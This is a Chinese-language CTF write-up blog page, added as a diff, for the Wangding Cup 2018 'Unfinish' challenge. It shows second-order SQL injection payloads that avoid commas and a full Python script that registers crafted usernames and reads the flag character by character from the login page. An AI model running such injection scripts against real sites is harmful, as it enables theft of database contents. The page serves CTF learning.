@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[网鼎杯2018]Unfinish | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[网鼎杯2018]Unfinish</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/17
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171940478.png" alt="image-20240617193917708"></p>
+<p>sql注入是这样的</p>
+<p>看了一眼登录界面，什么也没有</p>
+<p>放心了</p>
+<p>肯定是有注册页面</p>
+<p>register.php</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171941008.png" alt="image-20240617194105969"></p>
+<p>先随便注册一个</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171952499.png" alt="image-20240617195201465"></p>
+<p>登录发现回显的用户名</p>
+<p>这包的是二次注入的</p>
+<p>就是不知道怎么注入</p>
+<p>尝试了一下常规注入好像不大行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0</span><br></pre></td></tr></table></figure>
+
+<p>看了一下大佬的wp</p>
+<p>通过ascii码来进行读取</p>
+<p>同时使用from for代替逗号</p>
+<p>同时过滤了information</p>
+<p>所以表名只能靠猜，所以猜测是flag</p>
+<p>回到题目</p>
+<p>这样的注入是因为在一开始尝试了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr(database() from 1 for 1))</span><br></pre></td></tr></table></figure>
+
+<p>发现回显的是字符串所以猜测将上传的username两边加了引号</p>
+<p>payload则是为了闭合引号</p>
+<p>所以写脚本爆flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://fd61fced-c80d-4436-aa4e-b3aa75cf7fae.node5.buuoj.cn:81/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
